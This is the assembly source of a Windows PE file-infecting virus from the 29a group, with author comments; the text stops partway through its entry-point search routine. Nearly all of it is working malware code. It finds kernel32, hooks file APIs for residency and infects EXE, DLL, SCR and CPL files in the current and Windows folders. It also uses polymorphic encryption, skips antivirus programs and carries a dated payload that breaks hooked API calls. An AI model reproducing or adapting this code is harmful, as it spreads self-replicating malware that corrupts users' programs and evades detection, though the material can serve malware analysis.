
;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;                                                  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;     99 Ways To Die                                ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;     Coded by Bumblebee/29a                       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Words from the author ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . It  could  seem like a  remake of  Win32.RainSong. But i feel it's a
;   quite  new  virus. I  ever try to  re-use some 'well coded' piezes  of
;   code, so this virus has little parts of RainSong, AOC, ...
;   . I hope you'll find it  interesting, even if you've  seen my previous
;   viruses  yet due it  infects dinamic link  libraries  and executables.
;   . The name this time is due a kewl song by Megadeth. 99 Ways to die!
;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Disclaimer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . This is the source  code of a VIRUS. The author  is not responsabile
;   of any  damage that  may occur  due to the assembly of this file.  Use
;   it at your own risk. Cuidadiiin!
;
;   ÚÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Features ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÙ
;   . Win32 per-process resident PE infector.
;   . Infects 10 files per time from current and windows folders.
;   . Infection increasing last section.
;   . Uses EPO tech. If it cannot apply EPO, it doesn't infect. This makes
;     the virus  more hard  to detect, but infection  ratio falls a bit...
;   . Uses variable encryption with  polymorphism  and variable key slide.
;   . Size padding as  infection sign. Also  avoids  to infect  files with
;     CERW attributes in last section (i assume they're infected yet).
;     Marks files that are not adequate to be infected.
;   . Updates PE header checksum after infection.
;   . Hooks:
;             CreateFileA
;             MoveFileA
;             CopyFileA
;             CreateProcessA
;             SetFileAttributesA
;             GetFileAttributesA
;             SearchPathA
;             SetCurrentDirectoryA
;   . Gets  KERNEL32.DLL  address using SEH and searches for Win9x, WinNt
;     and Win2k.
;   . Uses CRC32 instead of names to get needed APIs.
;   . Self integrity  check  using  CRC32. This is easy to  implement and
;     quite effective way to make debug harder.
;   . Infects PE files with extension: EXE SCR CPL DLL.
;   . Takes care of the relocations (it infects DLL).
;   . Avoids infect most used av (only in runtime part).
;   . Has active  payload about a  year after infection. Payload  remains
;     active a whole month. At this month hooked API  will not work. This
;     is not as 'terrible' as it seems. User can change the date...
;     I know avers are going to say '...it's a dangerous...' shit.
;
;   There are other interesting things,  but i think is better you take a
;   look to  the comments  inside the code. Moreover  in  29#5 there is a
;   little article about considerations while infecting DLL.
;
;   I realy need a break... no more virus  coding for some months. I hope
;   you'll find nice this release. I have an idea about a nice tech...
;
;
;                                                       The way of the bee
;
.486p
locals
.model flat,STDCALL

        extrn           ExitProcess:PROC        ; needed for 1st generation
        extrn           MessageBoxA:PROC

;
; Some macros and equs
;

@strz   macro   string
        jmp     @@a
@@b:
        db      string,0
@@a:
        push    offset @@b
endm

; Notice this could work only in my system due the harcoded address of
; MessageBoxA, but this is only for debug in my comp ;)
@debug  macro   title,reg
        pushad
        push    1000h
@@tit:  @strz   title
        pop     eax
        add     eax,ebp
        push    eax
        push    reg
        push    0h
        mov     eax,0bff5412eh
        call    eax
        popad
endm

@hook   macro   ApiAddress
        lea     eax,ApiAddress
        jmp     generalHook
endm

vSize           equ     vEnd-vBegin
PADDING         equ     101
STRINGTOP       equ     160
crptSize        equ     vSize-5

; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends


.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE
inicio:                                         ; now i've realized i ever
                                                ; put this label in spanish!
        pushad
        call    getDelta

        lea     esi,vBegin+ebp                  ; setup CRC32 for 1st
        mov     edi,vSize-4                     ; generation
        call    CRC32
        mov     dword ptr [myCRC32+ebp],eax

        xor     dword ptr [hostRET+ebp],eax     ; hide hostEP
        popad

;
; 99Ways begins here!
;
vBegin  label   byte
        call    crypt                           ; decrypt

        ; here starts encrypted data -> vBegin + 5
        pushad

        ; get delta offset
        call    getDelta

        mov     eax,dword ptr [myCRC32+ebp]     ; restore hostEP
        xor     dword ptr [hostRET+ebp],eax     ; before CRC32

        lea     esi,vBegin+ebp                  ; integrity check
        mov     edi,vSize-4                     ; using CRC32
        call    CRC32

        cmp     eax,dword ptr [myCRC32+ebp]
        je      skipFakeProcess

        cli
        call    $                               ; this will fake the proc

skipFakeProcess:
        mov     esi,dword ptr [kernel32+ebp]    ; test last used
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,077f00000h                  ; test for winNt
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,077e00000h                  ; test for win2k
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,0bff70000h                  ; test for win9x
        call    GetKernel32
        jc      returnHost

getAPIsNow:
        ; now get APIs using CRC32
        mov     edi,0bff70000h                  ; coded using win9x
kernel32        equ $-4
        ; ^ this is a nice way to optimize code and hide data,
        ; almost all the non-temporary data can be plazed inside code!
        mov     esi,edi
        mov     esi,dword ptr [esi+3ch]
        add     esi,edi
        mov     esi,dword ptr [esi+78h]
        add     esi,edi
        add     esi,1ch

        lodsd
        add     eax,edi
        mov     dword ptr [address+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [names+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [ordinals+ebp],eax

        sub     esi,16
        lodsd
        mov     dword ptr [nexports+ebp],eax

        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     eax,FSTAPI+ebp

searchl:
        mov     esi,dword ptr [names+ebp]
        add     esi,edx
        mov     esi,dword ptr [esi]
        add     esi,edi
        push    eax edx edi
        xor     edi,edi
        movzx   di,byte ptr [eax+4]
        call    CRC32
        xchg    ebx,eax
        pop     edi edx eax
        cmp     ebx,dword ptr [eax]
        je      fFound
        add     edx,4
        inc     dword ptr [expcount+ebp]
        push    edx
        mov     edx,dword ptr [expcount+ebp]
        cmp     dword ptr [nexports+ebp],edx
        pop     edx
        je      returnHost
        jmp     searchl
fFound:
        shr     edx,1
        add     edx,dword ptr [ordinals+ebp]
        xor     ebx,ebx
        mov     bx,word ptr [edx]
        shl     ebx,2
        add     ebx,dword ptr [address+ebp]
        mov     ecx,dword ptr [ebx]
        add     ecx,edi

        mov     dword ptr [eax+5],ecx
        add     eax,9
        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     ecx,ENDAPI+ebp
        cmp     eax,ecx
        jb      searchl

        ; make a copy of virus in memory and work there
        push    00000040h
        push    00001000h OR 00002000h
        push    (vSize+1000h)
        push    0h
        call    dword ptr [_VirtualAlloc+ebp]
        or      eax,eax
        jz      returnHost

        lea     edi,vBegin+ebp
        sub     edi,dword ptr [virusEP+ebp]
        add     dword ptr [imageBase+ebp],edi   ; fix relocations
                                                ; in the hook routine
        lea     esi,vBegin+ebp
        mov     edi,eax
        mov     ecx,vSize
        rep     movsb

        ; patch file loaded copy
        call    patchVirusBody

        ; jmp into memory copy - put into edi the return address
        ; for the memory copy
        lea     edi,vBegin+ebp
        add     eax,offset memCopy-offset vBegin
        push    eax
        ret

memCopy:
        ; get delta offset another time for memory copy
        call    getDelta
        ; setup the ret to jmp patched virus copy
        mov     dword ptr [retPatch+ebp],edi

        mov     byte ptr [payload+ebp],0

        lea     edx,dateTime+ebp
        push    edx
        call    dword ptr [_GetSystemTime+ebp]

        lea     edx,dateTime+ebp
        mov     ax,word ptr [edx+2]
        mov     bx,-1
countdown       equ     $-2
        ; another time
        cmp     bx,ax                           ; the day arrived?
        jne     skipPay

        mov     byte ptr [payload+ebp],1

skipPay:
        ; alloc a temporary buffer to generate the poly sample
        ; of the virus ready to infect
        push    00000004h
        push    00001000h OR 00002000h
        push    (vSize+1000h)
        push    0h
        call    dword ptr [_VirtualAlloc+ebp]
        or      eax,eax
        jz      quitFromMem

        mov     dword ptr [memHnd+ebp],eax

        ; the same polymorphic routine is used for each infection
        ; in the current execution of the virus
        call    dword ptr [_GetTickCount+ebp]
        mov     edi,dword ptr [memHnd+ebp]
        add     edi,vSize
        mov     ecx,(crptSize/4)-(4-(crptSize MOD 4))
        call    GenDCrpt
        ; store the size of the sample (for infection process)
        add     eax,vSize
        mov     dword ptr [gensize+ebp],eax

        ; Hook the API to get per-process residency
        ; Notice this must be called before any infection
        call    hookApi

        ; set infection counter to 10
        mov     byte ptr [infCount+ebp],10
        call    infectDir                       ; infect current

        cmp     byte ptr [infCount+ebp],0       ; better performance
        je      quitFromMem

        lea     esi,currentPath+ebp             ; get current directory
        push    esi
        push    STRINGTOP
        call    dword ptr [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      quitFromMem

        push    STRINGTOP                       ; get windows directory
        lea     esi,tmpPath+ebp
        push    esi
        call    dword ptr [_GetWindowsDirectoryA+ebp]
        or      eax,eax
        jz      quitFromMem

        lea     esi,tmpPath+ebp                 ; goto windows directory
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      quitFromMem

        call    infectDir                       ; infect windows folder

        lea     esi,currentPath+ebp             ; go back home
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]

        ; this is the way to return host
        ; from the memory copy
        jmp     quitFromMem

returnHost:

        ; patch virus
        call    patchVirusBody

quitFromMem:
        popad
        push    1234568h
retPatch        equ     $-4
        ret

; i know this way to go back to host it's a bit weird but
; supports relocations (for DLL) and patches the virus
; to avoid be called more than once and ...
patchVirusBody:
        lea     edi,vBegin+ebp
        mov     dword ptr [retPatch+ebp],edi
        mov     byte ptr [edi],0e9h
        mov     esi,offset fakeHost
hostRET equ     $-4
        ; hehe
        mov     edx,edi
        sub     edx,offset vBegin
virusEP equ     $-4
        ; hehehe
        add     esi,edx
        sub     esi,5
        sub     esi,edi
        mov     dword ptr [edi+1],esi
        ret
;
; Returns Delta offset into ebp.
;
getDelta:
        call    delta
delta:
        pop     ebp
        sub     ebp,offset delta
        ret
;
; Gets KERNEL32.DLL address in memory.
;
GetKernel32:
        pushad
        xor     edx,edx
        lea     eax,dword ptr [esp-8h]
        xchg    eax,dword ptr fs:[edx]
        lea     edi,GetKernel32Exception+ebp
        push    edi
        push    eax

        cmp     word ptr [esi],'ZM'
        jne     GetKernel32NotFound
        mov     dx,word ptr [esi+3ch]
        cmp     esi,dword ptr [esi+edx+34h]
        jne     GetKernel32NotFound
        mov     dword ptr [kernel32+ebp],esi

        xor     edi,edi
        pop     dword ptr fs:[edi]
        pop     eax
        popad
        clc
        ret

GetKernel32Exception:
        xor     edi,edi
        mov     eax,dword ptr fs:[edi]
        mov     esp,dword ptr [eax]
GetKernel32NotFound:
        xor     edi,edi
        pop     dword ptr fs:[edi]
        pop     eax
        popad
        stc
        ret
;
; This routine makes CRC32.
;
CRC32:
	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret
;
; This routine hooks the APIs that gives virus residency.
; Takes care of relocations.
;
hookApi:
        pushad
        ; init the sem to free
        mov     byte ptr [semHook+ebp],0
        mov     edx,400000h
imageBase       equ $-4
        ; ;)
        cmp     word ptr [edx],'ZM'
        jne     noHook
        mov     edi,edx
        add     edi,dword ptr [edx+3ch]
        cmp     word ptr [edi],'EP'
        jne     noHook
        mov     edi,dword ptr [edi+80h]         ; RVA import
        or      edi,edi
        jz      noHook
        add     edi,edx
searchK32Imp:
        mov     esi,dword ptr [edi+0ch]         ; get name
        or      esi,esi
        jz      noHook
        add     esi,edx
        push    edi                             ; save (stringUp doesn't)
        call    stringUp
        pop     edi
        jc      nextName
        lea     esi,stringBuffer+ebp
        cmp     dword ptr [esi],'NREK'          ; look for Kernel32 module
        jne     nextName
        cmp     dword ptr [esi+4],'23LE'
        je      k32ImpFound
nextName:
        add     edi,14h
        mov     esi,dword ptr [edi]
        or      esi,esi
        jz      noHook
        jmp     searchK32Imp
k32ImpFound:
        mov     esi,dword ptr [edi+10h]         ; get address table
        or      esi,esi
        jz      noHook
        add     esi,edx
        lea     ecx,HOOKTABLEEND+ebp
nextImp:                                        ; search for APIs
        lea     edx,HOOKTABLEBEGIN+ebp
        lodsd
        or      eax,eax
        jz      noHook
checkNextAPI:
        mov     edi,dword ptr [edx]
        cmp     eax,dword ptr [edi+ebp]
        je      doHook
        add     edx,8
        cmp     edx,ecx
        jne     checkNextAPI
        jmp     nextImp
doHook:
        mov     eax,dword ptr [edx+4]
        add     eax,ebp
        mov     dword ptr [esi-4],eax
        add     edx,8
        cmp     edx,ecx
        jne     nextImp
noHook:
        popad
        ret
;
; Changes to upper case the string by esi storing into stringBuffer.
; Sets carry flag if our string buffer is small. Returns in edi the
; end of the string into the buffer.
;
stringUp:
        push    esi eax
        lea     edi,stringBuffer+ebp
        mov     eax,edi
        add     eax,STRINGTOP
stringUpLoop:
        cmp     eax,edi
        jne     continueStringUp
        stc
        jmp     stringUpOut
continueStringUp:
        movsb
        cmp     byte ptr [esi-1],'a'
        jb      skipThisChar
        cmp     byte ptr [esi-1],'z'
        ja      skipThisChar
        add     byte ptr [edi-1],'A'-'a'
skipThisChar:
        cmp     byte ptr [esi-1],0
        jne     stringUpLoop
        dec     edi
        clc
stringUpOut:
        pop     eax esi
        ret
;
; The hooks.
;
Hook0:
      @hook     _CreateFileA
Hook1:
      @hook     _MoveFileA
Hook2:
      @hook     _CopyFileA
Hook3:
      @hook     _CreateProcessA
Hook4:
      @hook     _SetFileAttributesA
Hook5:
      @hook     _GetFileAttributesA
Hook6:
      @hook     _SearchPathA
Hook7:
      @hook     _SetCurrentDirectoryA
;
; This is the general hook that provides per-process residency.
;
generalHook:
        push    eax
        pushad
        pushfd
        cld

        ; get delta offset
        call    getDelta
        ; setup the return hook
        mov     eax,dword ptr [eax+ebp]
        mov     dword ptr [esp+24h],eax

        ; check if filename==NULL
        mov     esi,dword ptr [esp+2ch]
        or      esi,esi
        jz      leaveHook

        ; check semaphore
        cmp     byte ptr [semHook+ebp],0
        jne     leaveHook

        mov     byte ptr [semHook+ebp],1

        cmp     byte ptr [payload+ebp],0
        je      skipPayloadEffect

        ; in the date of activation all hooked APIs will fail
        xor     eax,eax
        mov     dword ptr [esp+2ch],eax
        jmp     hookInfectionFail

skipPayloadEffect:
        call    stringUp
        jc      hookInfectionFail

        push    edi                             ; test the string it's
        sub     edi,esi                         ; long enought
        cmp     edi,5
        pop     edi
        jna     hookInfectionFail

        cmp     dword ptr [edi-4],'EXE.'
        je      infectThisFile
        cmp     dword ptr [edi-4],'LLD.'
        je      infectThisFile
        cmp     dword ptr [edi-4],'LPC.'
        je      infectThisFile
        cmp     dword ptr [edi-4],'RCS.'
        jne     hookInfectionFail

infectThisFile:
        lea     esi,stringBuffer+ebp            ; erm... here could touch
        call    infect                          ; any av! 

hookInfectionFail:
        mov     byte ptr [semHook+ebp],0
leaveHook:
        popfd
        popad
        ret
;
; Infects PE files in current directory. It affects EXE, SCR, CPL and DLL
; extensions.
;
infectDir:
        pushad

        lea     esi,find_data+ebp
        push    esi
        lea     esi,fndMask+ebp
        push    esi
        call    dword ptr [_FindFirstFileA+ebp]
        inc     eax
        jz      notFound
        dec     eax

        mov     dword ptr [findHnd+ebp],eax

findNext:
        lea     esi,find_data.cFileName+ebp
        call    stringUp
        lea     esi,stringBuffer+ebp
        push    edi                             ; test the string it's
        sub     edi,esi                         ; long enought
        cmp     edi,5
        pop     edi
        jna     skipThisFile
        cmp     dword ptr [edi-4],'EXE.'
        je      validFileExt
        cmp     dword ptr [edi-4],'LLD.'
        je      validFileExt
        cmp     dword ptr [edi-4],'LPC.'
        je      validFileExt
        cmp     dword ptr [edi-4],'RCS.'
        jne     skipThisFile

validFileExt:
        mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
        cmp     eax,8000h
        jb      skipThisFile                    ; at least 8000h bytes?
        mov     ecx,PADDING                     ; test if it's infected
        xor     edx,edx                         ; yet
        div     ecx
        or      edx,edx                         ; reminder is zero?
        jz      skipThisFile

testIfAv:                                       ; let's search for strings
                                                ; that may appear in av progs
        lea     edi,avStrings+ebp
        mov     ecx,vStringsCout
testIfAvL:
        push    esi
        mov     ax,word ptr [edi]
testAvLoop:
        cmp     word ptr [esi],ax
        jne     contTestLoop
        pop     esi
        jmp     skipThisFile
contTestLoop:
        inc     esi
        cmp     byte ptr [esi+3],0              ; skip the extension
        jne     testAvLoop
        pop     esi
        add     edi,2
        loop    testIfAvL

        lea     esi,stringBuffer+ebp
        call    infect

        cmp     byte ptr [infCount+ebp],0       ; test 10 infections
        je      infectionDone

skipThisFile:
        lea     esi,find_data+ebp
        push    esi
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindNextFileA+ebp]  ; Find next file
        or      eax,eax
        jnz     findNext

infectionDone:
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindClose+ebp]

notFound:
        popad
        ret
;
; Infects PE file increasing last section.
;
; ESI: addr of file name of PE to infect.
;
infect:
        pushad
        mov     dword ptr [fNameAddr+ebp],esi

        push    esi
        push    esi
        call    dword ptr [_GetFileAttributesA+ebp]
        pop     esi
        inc     eax
        jz      infectionError
        dec     eax

        mov     dword ptr [fileAttrib+ebp],eax

        push    esi
        push    00000080h
        push    esi
        call    dword ptr [_SetFileAttributesA+ebp]
        pop     esi
        or      eax,eax
        jz      infectionError

        xor     eax,eax
        push    eax
        push    00000080h
        push    00000003h
        push    eax
        push    eax
        push    80000000h OR 40000000h
        push    esi
        call    dword ptr [_CreateFileA+ebp]
        inc     eax
        jz      infectionErrorAttrib
        dec     eax

        mov     dword ptr [fHnd+ebp],eax

        push    0h
        push    eax
        call    dword ptr [_GetFileSize+ebp]
        inc     eax
        jz      infectionErrorClose
        dec     eax

        mov     dword ptr [fileSize+ebp],eax

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_GetFileTime+ebp]
        or      eax,eax
        jz      infectionErrorClose

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax

        mov     edi,eax
        cmp     word ptr [edi],'ZM'
        jne     infectionErrorCloseUnmap

        cmp     word ptr [edi+12h],'(:'         ; not valid file?
        je      infectionErrorCloseUnmap

        add     edi,dword ptr [edi+3ch]
        cmp     eax,edi
        ja      notValidFile                    ; avoid fucking headers
        add     eax,dword ptr [fileSize+ebp]
        cmp     eax,edi
        jb      notValidFile                    ; avoid fucking headers
        cmp     word ptr [edi],'EP'
        jne     notValidFile

        mov     edx,dword ptr [edi+16h]         ; test it's a valid PE
        and     edx,2h                          ; i want executable
        jz      notValidFile
        xor     edx,edx
        mov     dx,word ptr [edi+5ch]
        dec     edx                             ; i don't want NATIVE
        jz      notValidFile

        mov     edx,edi

        cmp     dword ptr [edx+28h],0           ; test code base!=0
        je      notValidFile                    ; this check is for some
                                                ; DLL with no exec code
        mov     esi,edi
        mov     eax,18h
        add     ax,word ptr [edi+14h]
        add     edi,eax
        mov     dword ptr [fstSec+ebp],edi

        push    edx
        mov     cx,word ptr [esi+06h]
        mov     ax,28h
        dec     cx
        mul     cx
        add     edi,eax
        pop     edx

        test    dword ptr [edi+24h],10000000h   ; avoid this kind of section
        jnz     notValidFile                    ; we can corrupt it!

        mov     eax,dword ptr [edi+24h]
        and     eax,0e0000020h
        cmp     eax,0e0000020h                  ; mmm... This is infected yet
        je      infectionErrorCloseUnmap

        mov     eax,dword ptr [edi+10h]         ; i rely on the headers...
        add     eax,dword ptr [edi+14h]
        mov     dword ptr [fileSize+ebp],eax

        sub     eax,dword ptr [edi+14h]         ; calc our RVA
        add     eax,dword ptr [edi+0ch]
        mov     dword ptr [myRVA+ebp],eax
        ; save virus entry point to calc relocations in
        ; execution time
        add     eax,dword ptr [esi+34h]
        mov     dword ptr [virusEP+ebp],eax

        call    searchEPO                       ; Search for a call
        jc      notValidFile

        push    edi edx ecx                     ; patch the call
        mov     edx,dword ptr [myRVA+ebp]
        add     edx,dword ptr [esi+34h]         ; edx = dest rva
        mov     edi,dword ptr [EPORva+ebp]
        add     edi,dword ptr [esi+34h]         ; edi = call rva
        sub     edx,edi
        sub     edx,5                           ; edx patch the call
        mov     ecx,dword ptr [EPOAddr+ebp]
        xchg    dword ptr [ecx+1],edx
        add     edx,edi                         ; get the rva
        add     edx,5
        mov     dword ptr [hostRET+ebp],edx     ; and store it ;)
        pop     ecx edx edi

        mov     eax,dword ptr [edi+08h]         ; fix the virtual size
        push    edx                             ; if needed
        mov     ecx,dword ptr [edx+38h]         ; some PE have strange
        xor     edx,edx                         ; virt size (cdplayer p.e.)
        div     ecx
        inc     eax
        or      edx,edx
        jz      rvaFixDone
        xor     edx,edx
        mul     ecx

        mov     dword ptr [edi+08h],eax         ; save the fixed virt size
rvaFixDone:

        ; save image base for hook API
        mov     edx,dword ptr [esi+34h]
        mov     dword ptr [imageBase+ebp],edx
        pop     edx

        push    edx                             ; calc the new virtual size
        mov     eax,BUFFERSIZE                  ; for the section
        add     eax,vSize
        mov     ecx,dword ptr [edx+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        pop     edx

        add     dword ptr [edi+08h],eax         ; fix the virtual size
        add     dword ptr [edx+50h],eax         ; fix the image size

        or      dword ptr [edi+24h],0e0000020h  ; set the properties

        push    edx                             ; calc new size for
        mov     eax,dword ptr [gensize+ebp]     ; the section
        mov     ecx,dword ptr [edx+3ch]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        pop     edx

        add     dword ptr [edi+10h],eax         ; store the phys size

        mov     edi,dword ptr [edx+80h]         ; get RVA Import
        xor     ecx,ecx
        mov     cx,word ptr [edx+06h]           ; number of sections
        mov     esi,dword ptr [fstSec+ebp]      ; get 1st section addr

impSectionLoop:                                 ; look for import section
        mov     ebx,dword ptr [esi+0ch]
        add     ebx,dword ptr [esi+08h]         ; test it's inside this
        cmp     edi,ebx                         ; section
        jb      impSectionFound
        add     esi,28h
        dec     ecx
        jnz     impSectionLoop

impSectionFound:
        or      dword ptr [esi+24h],80000000h   ; make writable

        push    edx                             ; calc file padding
        mov     ecx,PADDING                     ; (infection sign)
        add     eax,dword ptr [fileSize+ebp]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     dword ptr [pad+ebp],eax
        pop     edx

        ; update the virus sample ready to infect.
        call    updateVSample

        push    dword ptr [mapMem+ebp]
        call    dword ptr [_UnmapViewOfFile+ebp]

        push    dword ptr [fhmap+ebp]
        call    dword ptr [_CloseHandle+ebp]

        xor     eax,eax
        push    eax
        push    dword ptr [pad+ebp]
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax

        xor     eax,eax
        push    dword ptr [pad+ebp]
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax

        mov     ecx,dword ptr [gensize+ebp]
        mov     esi,dword ptr [memHnd+ebp]
        mov     edi,eax
        add     edi,dword ptr [fileSize+ebp]
        rep     movsb

        xchg    ecx,eax                         ; I want the padding
        mov     eax,edi                         ; to be zeroes...
        sub     eax,ecx
        mov     ecx,dword ptr [pad+ebp]
        sub     ecx,eax
        xor     eax,eax
        rep     stosb

                                                ; update the PE checksum
        mov     ecx,dword ptr [pad+ebp]
        inc     ecx
        shr     ecx,1
        mov     esi,dword ptr [mapMem+ebp]
        call    CheckSumMappedFile              ; calc partial check sum
        add     esi,dword ptr [esi+3ch]         ; goto begin of nt header
        mov     word ptr [pchcks+ebp],ax
        mov     edx,1                           ; complete the check sum
        mov     ecx,edx
        mov     ax,word ptr [esi+58h]
        cmp     word ptr [pchcks+ebp],ax
        adc     ecx,-1
        sub     word ptr [pchcks+ebp],cx
        sub     word ptr [pchcks+ebp],ax
        mov     ax,word ptr [esi+5ah]
        cmp     word ptr [pchcks+ebp],ax
        adc     edx,-1
        sub     word ptr [pchcks+ebp],dx
        sub     word ptr [pchcks+ebp],ax
        movzx   ecx,word ptr [pchcks+ebp]
        add     ecx,dword ptr [pad+ebp]
        mov     dword ptr [esi+58h],ecx         ; set new check sum

        dec     byte ptr [infCount+ebp]         ; another infection

infectionErrorCloseUnmap:
        push    dword ptr [mapMem+ebp]
        call    dword ptr [_UnmapViewOfFile+ebp]

infectionErrorCloseMap:
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_CloseHandle+ebp]

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_SetFileTime+ebp]

infectionErrorClose:
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CloseHandle+ebp]

infectionErrorAttrib:
        push    dword ptr [fileAttrib+ebp]
        push    dword ptr [fNameAddr+ebp]
        call    dword ptr [_SetFileAttributesA+ebp]

infectionError:
        popad
        ret
;
; Here the virus marks the file as no valid. This avoids later re-check
; the file in next executions of virus. Notice the infected files are not
; marked, for this issue i use size padding and test last section properties
; in second instance. Avers will find this mark in files that the virus
; doesn't want ;)
;
notValidFile:
        mov     edi,dword ptr [mapMem+ebp]
        mov     word ptr [edi+12h],'(:'         ; checked but not valid!
        jmp     infectionErrorCloseUnmap

;
; This my 'search EPO' routine. Searches for a call into the code section
; that points to:
;
;      push     ebp
;      mov      ebp,esp
;
; This is the way the high level languages get the arguments from a call
; of a procedure. If this code is found i assume the call found it's
; correct and i patch it to jump into the virus.
;
searchEPO:
        pushad
        mov     edi,dword ptr [esi+28h]         ; get host EP

        xor     ecx,ecx
        mov     cx,word ptr [esi+06h]           ; number of sections
        mov     esi,dword ptr [fstSec+ebp]      ; get 1st section addr

sectionLoop:                                    ; look for code section
        mov     ebx,dword ptr [esi+0ch]
        add     ebx,dword ptr [esi+08h]         ; test it's inside this
        cmp     edi,ebx                         ; section
        jb      sectionFound
        add     esi,28h
        dec     ecx
        jnz     sectionLoop
        stc
        jmp     searchEPOOut

sectionFound:
        test    dword ptr [esi+24h],10000000h   ; avoid this kind of section
        jnz     searchEPOFail                   ; we can corrupt it!

        push    esi
        sub     edi,dword ptr [esi+0ch]         ; get raw address
        add     edi,dword ptr [esi+14h]
        mov     ecx,dword ptr [esi+10h]
        cmp     ecx,edi
        jna     searchEPOFail
        sub     ecx,edi
        add     edi,dword ptr [mapMem+ebp]
        mov     ebx,edi
        add     ebx,ecx
        sub     ebx,10h                         ; high secure fence
callLoop:                                       ; loop that searches
        cmp     byte ptr [edi],0e8h             ; for the call
        jne     continueCallLoop
        mov     edx,edi
        add     edx,dword ptr [edi+1]
        add     edx,5
        cmp     ebx,edx
        jb      continueCallLoop
        cmp     edx,dword ptr [mapMem+ebp]
        jb      continueCallLoop
        mov     esi,edx
        mov     dx,word ptr [esi]
        cmp     dx,08b55h
        jne     continueCallLoop
        mov     dx,word ptr [esi+1]
        cmp     dx,0ec8bh
        jne     continueCallLoop
        mov     dword ptr [EPOAddr+ebp],edi
        sub     edi,dword ptr [mapMem+ebp]
